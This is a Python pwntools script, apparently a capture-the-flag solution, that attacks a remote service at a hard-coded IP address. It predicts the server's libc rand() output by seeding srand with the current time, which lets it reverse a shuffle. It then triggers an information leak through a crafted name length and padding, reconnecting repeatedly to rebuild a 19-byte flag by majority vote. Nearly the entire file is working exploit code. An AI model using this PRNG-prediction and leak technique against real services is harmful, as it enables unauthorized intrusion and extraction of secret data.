import ctypes
from pwn import *
tob = lambda x: str(x).encode("utf-8")
import tqdm

context.log_level = 'debug'

flag_length = 19
flag = bytearray([0] * flag_length)
flag_map = [{} for _ in range(flag_length)]

bar = tqdm.tqdm()

while 0 in flag:
    # io = process("./name")
    cdll = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    io = remote("43.248.97.200", 40041)
    # print(cdll.time(0))
    cdll.srand(cdll.time(0)+1)
    
    size = cdll.rand() % 0x100

    x = [i for i in range(flag_length)]
    for i in range(101):
        a, b = cdll.rand() % flag_length, cdll.rand() % flag_length
        x[a], x[b] = x[b], x[a]

    log.success(f"size: {size:#x}")
    io.sendlineafter(b"Name length:", tob(size))
    io.send(b"a" * 15 + b"x")
    try:
        io.recvuntil(b"x")
        piece = io.recvuntil(b",", drop=True)
        assert len(piece) == (flag_length - 16), piece
        for i in range(len(piece)):
            # if flag[x[-i-1]] == 0 or flag[x[-i-1]] == piece[-i-1]
            flag_map[x[-i-1]][piece[-i-1]] = flag_map[x[-i-1]].get(piece[-i-1], 0) + 1
            flag[x[-i-1]] = sorted(flag_map[x[-i-1]].items(), key=lambda xx: xx[1], reverse=True)[0][0]
        # print(flag, x, piece)
        # print(f"[+] {flag}")
        bar.set_description(f"[+] {flag}")
        bar.update()
    except EOFError as e:
        pass
    except AssertionError as e:
        # print(e)
        pass
    finally:
        io.close()
        # pause(0.5)
        sleep(0.5)